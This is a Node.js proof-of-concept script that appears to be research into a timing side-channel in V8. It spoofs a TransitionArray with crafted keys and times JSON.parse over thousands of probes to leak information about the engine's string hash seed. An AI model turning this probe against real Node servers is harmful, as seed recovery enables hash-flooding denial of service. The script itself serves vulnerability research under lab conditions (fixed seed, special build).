'use strict';

const util = require('util');

// Needs to be run with --hash_seed=1 and node compiled --without-snapshot
const SEED = 1;
const AMPLIFICATION = 4096;
const REPEAT = 1;
const SPOOF_COUNT = 1024 + 512;
const KEY_COUNT = 1;
const EXTRACT_COUNT = 2048;

const common = require('./common');
const hash = common.createHash(SEED);
const findPos = common.findPos;
const hashToStr = common.hashToStr;

// (global) DescriptorLookupCache::kLength = 64
// DescriptorArray::kMaxNumberOfDescriptors = 2**10 - 2 = 1022
// TransitionArray::kMaxNumberOfTransitions = 1024 + 512

let offset = (Math.random() * 0xffffffff) >>> 0;

function genKey() {
  return common.key(offset++);
}

function measure(json) {
  const start = process.hrtime();
  const r = JSON.parse(json);
  const end = process.hrtime(start);

  return end[0] * 1e9 + end[1];
}

function runProbe(spoof, keys, otherKey) {
  const probe = common.getProbe(spoof, keys, otherKey, AMPLIFICATION);

  let avg = 0;
  let count = 0;
  for (let i = 0; i < REPEAT; i++) {
    avg += measure(probe);
    count++;
  }

  return avg / count;
}

// Spoof TransitionArray
const spoof = [];
for (let i = 0; i < SPOOF_COUNT; i++)
  spoof.push(genKey());

let key;
do
  key = genKey();
while (!(0x1ff00000 <= hash(key) && hash(key) <= 0x20100000));
console.error(key);
console.error(common.hashToStr(hash(key)));

const timings = [];
for (let i = 0; i < EXTRACT_COUNT; i++) {
  const otherKey = genKey();
  const time = runProbe(spoof, [ key ], otherKey);
  timings.push({ key: otherKey, time: time });

  console.log(otherKey + ',' + time);
}

const res = common.splitTimings(timings);
console.error('centers=%j left=%d right=%d',
              res.centers, res.left.length, res.right.length);
